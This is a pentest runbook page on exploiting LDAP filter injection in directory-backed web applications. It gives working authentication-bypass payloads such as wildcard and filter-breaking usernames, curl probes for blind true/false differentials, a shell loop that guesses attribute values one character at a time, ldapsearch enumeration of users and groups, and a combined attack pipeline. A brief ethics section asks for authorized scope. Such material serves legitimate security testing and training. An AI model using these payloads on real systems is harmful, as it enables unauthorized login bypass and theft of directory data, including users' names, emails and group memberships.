---
title: "LDAP Injection"
description: "Exploit LDAP filter injection for authentication bypass and blind attribute extraction in directory-backed apps."
phase: Web
order: 48
tags:
  - ldap
  - injection
  - auth
  - directory
tools:
  - ldapsearch
  - jq
  - burp suite
updated: 2026-10-01
---

A runbook for **LDAP injection** in an authorized scope. Goal: prove filter injection in login and search flows, extract data blind if needed, and show the impact on directory-backed authorization.

## 1. Learn the filter grammar

Filters combine attributes and operators in parentheses. Injection targets where your input is concatenated.

```text
(&(uid=USER)(userPassword=PASS))
(|(uid=*)(cn=*))
```

Special characters: `* ( ) \ | & !` and null. Escape sequences like `\28`, `\2a`, `\29` may bypass naive filters.

## 2. Enumerate the directory (if reachable)

Confirm base DNs, naming contexts, and whether anonymous binds are allowed.

```bash
ldapsearch -x -H ldap://target:389 -s base -b '' namingContexts
ldapsearch -x -H ldap://target:389 -b 'dc=target,dc=com' '(objectClass=*)' dn | head -n 30
```

## 3. Authentication bypass

Make the login filter always true. Test username and password fields independently.

```bash
curl -s https://target/login -d 'username=*&password=x'
curl -s https://target/login -d 'username=admin)(&)&password=x'
curl -s https://target/login -d 'username=*)(uid=*))(|(uid=*&password=x'
curl -s https://target/login -d 'username=admin&password=*'
```

## 4. Blind boolean extraction

When nothing is reflected, infer data from response differences. Use TRUE/FALSE filters and compare status/body length.

```bash
# TRUE (should differ from the FALSE probe)
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' https://target/search -d 'q=admin)(|(uid=admin'
# FALSE
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' https://target/search -d 'q=admin)(|(uid=zzzz'
```

## 5. Character-by-character guessing

Automate regex-style prefix guessing of an attribute value via wildcard filters.

```bash
for c in a b c d e f g 0 1 2 3 4 5 6 7 8 9; do
  code=$(curl -s -o /dev/null -w '%{size_download}' https://target/search -d "q=admin)(description=${c}*")
  echo "$c -> $code"
done
```

## 6. Enumerate attributes and groups

Once injection is confirmed, pull user/group attributes with `ldapsearch` to show what is exposed.

```bash
ldapsearch -x -H ldap://target:389 -b 'dc=target,dc=com' '(uid=admin)' uid cn mail memberOf
ldapsearch -x -H ldap://target:389 -b 'dc=target,dc=com' '(objectClass=groupOfNames)' cn member -o ldif-wrap=no
```

## 7. Full pipeline (one block)

```bash
HOST=target
# directory recon
ldapsearch -x -H "ldap://$HOST:389" -s base -b '' namingContexts
# auth bypass attempts
for p in '*' 'admin)(&)' '*)(uid=*))(|(uid=*' ; do
  echo "== $p"; curl -s -o /dev/null -w '%{http_code}\n' "https://$HOST/login" --data-urlencode "username=$p" --data 'password=x'
done
# blind TRUE/FALSE differential
curl -s -o /dev/null -w 'TRUE  %{http_code} %{size_download}\n' "https://$HOST/search" -d 'q=admin)(|(uid=admin'
curl -s -o /dev/null -w 'FALSE %{http_code} %{size_download}\n' "https://$HOST/search" -d 'q=admin)(|(uid=zzzz'
# prefix guessing
for c in a b c d e f 0 1 2 3; do
  code=$(curl -s -o /dev/null -w '%{size_download}' "https://$HOST/search" -d "q=admin)(description=${c}*")
  echo "$c -> $code"
done
# attribute enumeration
ldapsearch -x -H "ldap://$HOST:389" -b 'dc=target,dc=com' '(uid=admin)' uid cn mail memberOf
```

## Ethics & legality

- Only test directories in an official scope or with written authorization.
- Prove access to a single unexpected record; do not dump the whole directory.
- Note the exact injectable parameter and which characters are unescaped.
